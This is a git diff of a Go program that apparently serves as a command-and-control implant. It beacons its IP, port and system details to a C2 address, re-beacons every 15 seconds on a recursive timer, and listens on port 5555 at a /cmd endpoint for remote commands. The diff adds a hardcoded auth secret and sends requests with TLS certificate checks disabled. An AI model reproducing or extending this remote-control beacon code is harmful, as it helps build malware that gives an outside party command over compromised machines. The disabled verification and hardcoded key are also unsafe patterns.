@@ -30,6 +30,9 @@ type Answer struct {
 	Result      string
 }
 
+var timeOfRefresh int = 15 //time in seconds
+var secretKey string = "Bl5cMvdxpej8efG3vCQBl0UVLFByoQ9W"
+
 func findLocalAddress(ips []net.IP) []string {
 	//192.168.0.?
 	//10.?.?.?
@@ -91,6 +94,7 @@ func main() {
 	//sendReadySignal(ip_addr)
 
 	go sendReadySignal(ip_addr)
+	go UpdateConnection()
 	startServer()
 
 }
@@ -103,15 +107,15 @@ func sendReadySignal(ip *string) {
 
 	fmt.Printf(c2_addr)
 	fmt.Printf("\n")
-	// body := strings.NewReader(fmt.Sprintf(`
-	// {
-	// 	"Ip":"%s",
-	// 	"Port":"%s",
-	// 	"System":"%s",
-	// 	"Key":"%s",
-	// 	"Date":"%s"
-	// }
-	// `, local_IP, "5555", "Windows", "123456789", time.Now().String()))
+	body := fmt.Sprintf(`
+	{
+		"Ip":"%s",
+		"Port":"%s",
+		"System":"%s",
+		"Key":"%s",
+		"Date":"%s"
+	}
+	`, "192.168.0.1", "5555", "Windows", "123456789", time.Now().String())
 
 	// resp, err := http.Post(c2_addr, "application/json", body)
 	// if err != nil {
@@ -119,25 +123,33 @@ func sendReadySignal(ip *string) {
 	// }
 	// resp.Body.Close()
 	// fmt.Printf("Status: " + resp.Status + "\n")
-	body := fmt.Sprintf(`
-	{
-		"Ip":"%s",
-		"Command":"%s",
-		"Key_Manager":"%s",
-		"Key_Client":"%s",
-		"Result":"%s"
-	}
-	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")
+
+	// body := fmt.Sprintf(`
+	// {
+	// 	"Ip":"%s",
+	// 	"Command":"%s",
+	// 	"Key_Manager":"%s",
+	// 	"Key_Client":"%s",
+	// 	"Result":"%s"
+	// }
+	// `, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")
 
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
+	r, err := http.NewRequest("POST", link, bytes.NewBufferString(body))
+	if err != nil {
+		panic(err)
+	}
+	r.Header.Add("Content-Type", "application/json")
+	r.Header.Set("auth-key", secretKey)
 	client := &http.Client{Transport: tr}
 
-	response, err := client.Post(link, "application/json", bytes.NewBufferString(body))
+	response, err := client.Do(r)
 	if err != nil {
-		fmt.Println(err)
+		panic(err)
 	}
+
 	defer response.Body.Close()
 
 	content, _ := ioutil.ReadAll(response.Body)
@@ -193,6 +205,23 @@ func SendAnswer() {
 	s := strings.TrimSpace(string(content))
 	fmt.Printf(s)
 }
+
+func UpdateConnection() {
+	time1 := time.NewTimer(time.Duration(timeOfRefresh) * time.Second)
+	//	time1 := time.NewTimer(time.Duration(time.Duration(timeOfRefresh).Seconds()))
+
+	<-time1.C
+
+	fmt.Printf("\n")
+	fmt.Printf("TIMER OVER \n")
+	var ip_addr *string
+	ip_addr = new(string)
+	*ip_addr = "localhost:443"
+	sendReadySignal(ip_addr)
+	UpdateConnection()
+
+}
+
 func startServer() {
 	fmt.Printf("Server started")
 	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
@@ -219,6 +248,6 @@ func startServer() {
 
 		json.NewEncoder(w).Encode(body)
 	})
-
+	// NEW HANDLE TO REFRESH FROM C2 + Logging
 	http.ListenAndServe(":5555", nil)
 }
